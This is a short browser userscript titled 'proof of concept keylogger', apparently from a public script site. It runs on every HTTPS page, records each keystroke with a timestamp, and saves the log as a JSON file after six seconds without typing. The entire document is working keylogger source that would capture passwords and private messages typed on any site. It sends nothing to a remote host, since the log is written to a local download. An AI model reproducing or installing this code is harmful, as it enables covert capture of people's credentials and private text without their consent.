// ==UserScript==
// @name         proof of concept keylogger
// @namespace    https://localhost
// @version      0.4
// @description  Logs keystrokes to a file 6 seconds after the last keypress, now in human-readable format.
// @author       matts0613
// @match        https://*/*
// @match        localhost
// @grant        GM_xmlhttpRequest
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/528935/proof%20of%20concept%20keylogger.user.js
// @updateURL https://update.greasyfork.org/scripts/528935/proof%20of%20concept%20keylogger.meta.js
// ==/UserScript==

(function () {
    'use strict';

    let log = [];
    let typingTimer;
    let doneTypingInterval = 6000; // 6 seconds
    let sessionStart = new Date().toISOString(); // Track session start time

    document.addEventListener('keydown', function (event) {
        log.push({
            key: event.key,
            timestamp: new Date().toLocaleString() // Convert timestamp to readable format
        });

        clearTimeout(typingTimer);
        typingTimer = setTimeout(function () {
            console.log("User has stopped typing for 6 seconds - saving log-key.json file.");

            if (log.length > 0) {
                let logData = {
                    session_start: sessionStart,
                    total_keystrokes: log.length,
                    keypresses: log
                };

                const blob = new Blob([JSON.stringify(logData, null, 4)], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = 'log-key.json';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
                log = []; // Clear log after saving
            }
        }, doneTypingInterval);
    });

})();
